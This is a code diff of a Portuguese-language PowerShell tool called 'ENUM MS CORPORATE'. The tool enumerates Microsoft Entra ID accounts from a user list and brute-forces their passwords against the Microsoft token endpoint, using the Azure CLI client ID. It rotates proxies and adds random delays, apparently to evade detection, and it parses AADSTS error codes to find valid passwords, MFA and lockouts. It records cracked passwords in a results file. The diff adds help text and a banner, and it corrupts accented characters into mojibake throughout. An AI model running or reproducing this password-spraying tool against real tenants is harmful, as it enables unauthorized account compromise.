@@ -6,23 +6,63 @@ param(
     [switch]$NoQuestion,
     [string]$Proxy,
     [string[]]$ProxyList,
-    [switch]$ProxyUseDefaultCredentials
+    [switch]$ProxyUseDefaultCredentials,
+    [Alias("h")]
+    [switch]$Help
     )
 
-Write-Host "para usar rode o comando .\enum_passs_brute_fixed_v2.ps1 -Domain empresa.com -UserList .\users.txt -TestLogin [-Proxy http://127.0.0.1:8080]"
+function Show-Usage {
+    Write-Host ""
+    Write-Host "USO" -ForegroundColor Cyan
+    Write-Host "  .\enum_passs_brute_fixed_v2.ps1 -Domain <dominio> -UserList <arquivo> [opcoes]"
+    Write-Host ""
+    Write-Host "PARAMETROS" -ForegroundColor Cyan
+    Write-Host "  -Domain <dominio>                  Dominio alvo. Ex: empresa.onmicrosoft.com"
+    Write-Host "  -UserList <arquivo>                Arquivo com usuarios, um por linha"
+    Write-Host "  -TestLogin                         Testa login para usuarios validos"
+    Write-Host "  -NoQuestion, -nq                   Nao pergunta antes de testar login"
+    Write-Host "  -Proxy <url>                       Usa um proxy unico"
+    Write-Host "  -ProxyList <url1>,<url2>           Usa um ou mais proxies com rotacao"
+    Write-Host "  -ProxyUseDefaultCredentials        Usa credenciais Windows no proxy"
+    Write-Host "  -Help, -h                          Mostra esta ajuda"
+    Write-Host ""
+    Write-Host "EXEMPLOS" -ForegroundColor Cyan
+    Write-Host "  .\enum_passs_brute_fixed_v2.ps1 -Domain empresa.onmicrosoft.com -UserList .\users.txt"
+    Write-Host "  .\enum_passs_brute_fixed_v2.ps1 -Domain empresa.onmicrosoft.com -UserList .\users.txt -TestLogin -nq"
+    Write-Host "  .\enum_passs_brute_fixed_v2.ps1 -Domain empresa.onmicrosoft.com -UserList .\users.txt -TestLogin -Proxy `"http://127.0.0.1:8080`""
+    Write-Host "  .\enum_passs_brute_fixed_v2.ps1 -Domain empresa.onmicrosoft.com -UserList .\users.txt -TestLogin -ProxyList `"http://127.0.0.1:8080`",`"http://127.0.0.1:8081`""
+    Write-Host ""
+}
+
+if ($Help) {
+    Show-Usage
+    exit
+}
+
+Write-Host "=================================================================" -ForegroundColor DarkGray
+Write-Host "    _____ _   _ _   _ __  __     __  __ ____" -ForegroundColor Cyan
+Write-Host "   | ____| \ | | | | |  \/  |   |  \/  / ___|" -ForegroundColor Cyan
+Write-Host "   |  _| |  \| | | | | |\/| |   | |\/| \___ \" -ForegroundColor Cyan
+Write-Host "   | |___| |\  | |_| | |  | |   | |  | |___) |" -ForegroundColor Cyan
+Write-Host "   |_____|_| \_|\___/|_|  |_|   |_|  |_|____/" -ForegroundColor Cyan
+Write-Host "`n`n"
+Write-Host "             ENUM MS CORPORATE" -ForegroundColor Yellow
+Write-Host "-----------------------------------------------------------------" -ForegroundColor DarkGray
+Write-Host " ferramenta para enumeracao de contas corporativas da Microsoft" -ForegroundColor Gray
+Write-Host "=================================================================`n`n" -ForegroundColor DarkGray
 
 # =========================
 # CONFIG
 # =========================
 $ClientId = "04b07795-8ddb-461a-bbee-02f9e1bf7b46" # Azure CLI
 
-# Verificar e instalar módulo MSAL.PS se necessário
+# Verificar e instalar mÃ³dulo MSAL.PS se necessÃ¡rio
 if (!(Get-Module -ListAvailable -Name MSAL.PS)) {
-    Write-Host "[+] Instalando módulo MSAL.PS..." -ForegroundColor Cyan
+    Write-Host "[+] Instalando mÃ³dulo MSAL.PS..." -ForegroundColor Cyan
     Install-Module -Name MSAL.PS -Force -Scope CurrentUser -AllowClobber
 }
 
-# Importar módulo MSAL.PS
+# Importar mÃ³dulo MSAL.PS
 Import-Module MSAL.PS -ErrorAction Stop
 
 if (!(Get-Module -ListAvailable -Name ImportExcel)) {
@@ -33,7 +73,7 @@ if (!(Get-Module -ListAvailable -Name ImportExcel)) {
 Import-Module ImportExcel -ErrorAction Stop
 
 if (!(Test-Path $UserList)) {
-    Write-Host "[ERRO] Wordlist não encontrada: $UserList" -ForegroundColor Red
+    Write-Host "[ERRO] Wordlist nÃ£o encontrada: $UserList" -ForegroundColor Red
     exit
 }
 
@@ -46,7 +86,7 @@ $valid   = 0
 $invalid = 0
 $unknown = 0
 
-Write-Host "`n[+] Iniciando enumeração..." -ForegroundColor Cyan
+Write-Host "`n[+] Iniciando enumeraÃ§Ã£o..." -ForegroundColor Cyan
 
 $loginStatusColors = @{
     "SENHA_INCORRETA"            = "Yellow"
@@ -207,7 +247,7 @@ foreach ($user in Get-Content $UserList) {
 
     try {
         # =========================
-        # ENUMERAÇÃO / EXISTÊNCIA
+        # ENUMERAÃ‡ÃƒO / EXISTÃŠNCIA
         # =========================
         Set-RequestProxy -Proxies $activeProxies | Out-Null
 
@@ -256,7 +296,7 @@ foreach ($user in Get-Content $UserList) {
         }
 
         # =========================
-        # DECISÃO: TESTAR LOGIN
+        # DECISÃƒO: TESTAR LOGIN
         # =========================
         $doLogin = $false
 
@@ -284,7 +324,7 @@ foreach ($user in Get-Content $UserList) {
             if (Test-Path $caminhoSenhas) {
                 $listaSenhas = Get-Content $caminhoSenhas
                 
-                # Obter o TenantID uma única vez antes do loop para ser mais rápido
+                # Obter o TenantID uma Ãºnica vez antes do loop para ser mais rÃ¡pido
                 try {
                     Set-RequestProxy -Proxies $activeProxies | Out-Null
 
@@ -294,7 +334,7 @@ foreach ($user in Get-Content $UserList) {
                     $tenantId = $tenantResponse.token_endpoint.Split('/')[3]
                     $tokenUrl = "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token"
                 } catch {
-                    Write-Host "Erro ao resolver domínio: $($_.Exception.Message)" -ForegroundColor Red
+                    Write-Host "Erro ao resolver domÃ­nio: $($_.Exception.Message)" -ForegroundColor Red
                     $listaSenhas = @() # Impede a entrada no loop
                 }
 
@@ -323,10 +363,10 @@ foreach ($user in Get-Content $UserList) {
                             $objResultado = [pscustomobject]@{
                                 Email  = $email
                                 Status = $loginStatus
-                                Senha  = $plainPass  # <-- Esta é a nova coluna
+                                Senha  = $plainPass  # <-- Esta Ã© a nova coluna
                                 Data   = (Get-Date -Format "dd/MM/yyyy HH:mm:ss")
                             }
-                            Write-Host "✅ Sucesso para: $email" -ForegroundColor Green
+                            Write-Host "âœ… Sucesso para: $email" -ForegroundColor Green
                             Save-Result -Result ([pscustomobject]@{
                                 DataHora    = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                                 Email       = $email
@@ -355,7 +395,7 @@ foreach ($user in Get-Content $UserList) {
                                     $loginStatus = "LOGIN_OK MAS MFA REQUERIDO"
                                     if ($mfaStatus -eq "NAO_DETECTADO") { $mfaStatus = "MFA_REQUERIDO" }
                                     $pararTesteSenhas = $true
-                                    break # Interrompe o loop pois a senha está correta, mas barrou no MFA
+                                    break # Interrompe o loop pois a senha estÃ¡ correta, mas barrou no MFA
                                 }
                                 "AADSTS50053" { 
                                     $loginStatus = "CONTA_BLOQUEADA"
@@ -365,7 +405,7 @@ foreach ($user in Get-Content $UserList) {
                                 "AADSTS50034" { 
                                     $loginStatus = "USUARIO_NAO_ENCONTRADO" 
                                     $pararTesteSenhas = $true
-                                    break # Para de tentar se o email não existir
+                                    break # Para de tentar se o email nÃ£o existir
                                 }
                                 default { $loginStatus = "ERRO" }
                             }
@@ -387,7 +427,7 @@ foreach ($user in Get-Content $UserList) {
                         }) -LoginStatus $loginStatus
                         $tentativasLoginRegistradas++
 
-                        # Só faz o sleep se NÃO tiver acertado a senha (evita esperar à toa no final)
+                        # SÃ³ faz o sleep se NÃƒO tiver acertado a senha (evita esperar Ã  toa no final)
                         if ($loginStatus -eq "SENHA_INCORRETA" -or $loginStatus -eq "ERRO") {
                             $tempoAleatorio = Get-Random -Minimum 1 -Maximum 3 
                             Write-Host "Aguardando $tempoAleatorio segundos..." -ForegroundColor Gray
